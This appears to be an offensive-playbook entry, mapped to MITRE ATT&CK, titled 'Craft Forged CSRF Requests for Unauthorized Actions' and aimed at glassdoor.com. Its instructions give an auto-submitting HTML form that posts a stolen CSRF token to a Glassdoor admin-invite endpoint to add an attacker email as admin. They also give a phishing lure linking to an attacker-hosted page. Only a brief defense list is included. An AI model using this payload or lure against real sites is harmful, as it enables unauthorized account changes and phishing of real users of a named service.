---
id: proc-glassdoor-forge-requests-001
tags:
  - csrf
  - request-forgery
  - web
type: procedure
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:57.827Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Forged CSRF Requests for Unauthorized Actions

## Summary

This procedure involves creating HTML forms or requests that include the obtained CSRF token to submit unauthorized POST actions to glassdoor.com on behalf of a logged-in victim.

## Description

Exploiting the CSRF vulnerability, attackers host a malicious page that auto-submits forms to Glassdoor endpoints (e.g., profile edit or admin invite). The victim's browser includes session cookies automatically, while the attacker supplies the valid token, bypassing validation. This enables actions like editing profiles or inviting admins without direct access.

## Requirements

1. Valid CSRF token from previous procedure
2. Attacker-controlled web server to host malicious HTML
3. Victim tricked into visiting the malicious page (e.g., via email link)

## Defense

Defensive measures and detection strategies:

- Enforce same-site cookies (Lax/Strict) to prevent cross-origin submissions
- Log and alert on POST requests with mismatched tokens or referers
- Educate users on not clicking untrusted links

## Objectives

1. Submit forged requests using victim's session
2. Perform actions like profile edits or invites
3. Confirm acceptance by server without errors

## Instructions

### Step 1: Create Malicious HTML Form

**Context**: Build an HTML page with a form targeting a Glassdoor endpoint, embedding the CSRF token.

Example HTML:

```html
<!DOCTYPE html>
<html>
<body>
<form action="https://www.glassdoor.com/employer/invite-admin" method="POST" id="csrfForm">
    <input type="hidden" name="_csrf" value="abc123">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="role" value="admin">
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

> Expected output: Form auto-submits when page loads, sending request with token.

### Step 2: Host and Lure Victim

**Context**: Serve the HTML from attacker server and send link to victim.

Upload to a hosting service and phishing email: "Click here to view job update: http://evil.com/csrf.html".

> Expected output: Victim's browser submits request; check Glassdoor for action confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[Phishing]]
